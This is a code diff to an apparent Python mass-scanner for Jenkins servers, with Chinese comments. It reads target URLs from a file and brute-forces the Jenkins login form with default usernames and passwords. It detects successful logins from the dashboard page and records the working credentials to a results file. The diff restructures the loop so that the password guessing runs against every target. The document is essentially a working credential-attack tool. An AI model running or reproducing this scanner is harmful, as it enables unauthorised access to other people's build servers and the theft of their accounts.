@@ -8,7 +8,8 @@ import urllib3
 import re
 urllib3.disable_warnings()
 q=queue.Queue()
-
+#调整判断逻辑
+#判断whoami
 file=open('website.txt')
 for x in file.readlines():
         q.put(x.strip())
@@ -43,39 +44,40 @@ def scan():
                         with open('result.txt', 'a') as ff:
                             ff.write(url2+' 可创建账号'+ '\n')
                     else:
-                        url3 = url+'/j_acegi_security_check'
-                        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
-                                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                                         "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
-                                         "Accept-Encoding": "gzip, deflate", "DNT": "1",
-                                         "Referer": url+'/login?from=%2F', "Connection": "close",
-                                         "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
-                        for admin in ['admin','test','root']:
-                            for password in ['admin','password','123456','root']:
-                                burp0_data = {"j_username": admin, "j_password": password, "from": "/",
-                                              "Submit": urllib.parse.unquote('%E7%99%BB%E5%BD%95')}
-                                res3 = requests.post(url3, headers=burp0_headers, data=burp0_data, proxies=proxies,
-                                                    allow_redirects=False)
+                        pass
+                    url3 = url+'/j_acegi_security_check'
+                    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
+                                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                                     "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+                                     "Accept-Encoding": "gzip, deflate", "DNT": "1",
+                                     "Referer": url+'/login?from=%2F', "Connection": "close",
+                                     "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
+                    for admin in ['admin','test','root']:
+                        for password in ['admin','password','123456','root']:
+                            burp0_data = {"j_username": admin, "j_password": password, "from": "/",
+                                          "Submit": urllib.parse.unquote('%E7%99%BB%E5%BD%95')}
+                            res3 = requests.post(url3, headers=burp0_headers, data=burp0_data, proxies=proxies,
+                                                allow_redirects=False)
 
-                                New_Cookie=res3.headers['Set-Cookie']
+                            New_Cookie=res3.headers['Set-Cookie']
 
 
-                                url4 = url
-                                burp0_cookies = {"JSESSIONID.b2cd0296": "node0ezkem89pqto514a6f0mwfe53z305.node0"}
-                                burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
-                                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                                                 "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
-                                                 "Accept-Encoding": "gzip, deflate", "DNT": "1",
-                                                 "Referer": url4+'/login?from=/', "Connection": "close",
-                                                 "Cookie": New_Cookie,
-                                                 "Upgrade-Insecure-Requests": "1"}
-                                res4=requests.get(url4, headers=burp0_headers)
-                                if r'Dashboard [Jenkins]' in str(res4.text.encode('utf-8')):
-                                    print(url3+'存在弱口令'+admin+':'+password)
-                                    with open('result.txt', 'a') as fff:
-                                        fff.write(url3+'存在弱口令'+admin+':'+password + '\n')
-                                else:
-                                    pass
+                            url4 = url
+                            burp0_cookies = {"JSESSIONID.b2cd0296": "node0ezkem89pqto514a6f0mwfe53z305.node0"}
+                            burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
+                                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                                             "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+                                             "Accept-Encoding": "gzip, deflate", "DNT": "1",
+                                             "Referer": url4+'/login?from=/', "Connection": "close",
+                                             "Cookie": New_Cookie,
+                                             "Upgrade-Insecure-Requests": "1"}
+                            res4=requests.get(url4, headers=burp0_headers)
+                            if r'Dashboard [Jenkins]' in str(res4.text.encode('utf-8')):
+                                print(url3+'存在弱口令'+admin+':'+password)
+                                with open('result.txt', 'a') as fff:
+                                    fff.write(url3+'存在弱口令'+admin+':'+password + '\n')
+                            else:
+                                pass
                         else:
                             pass
                 else:
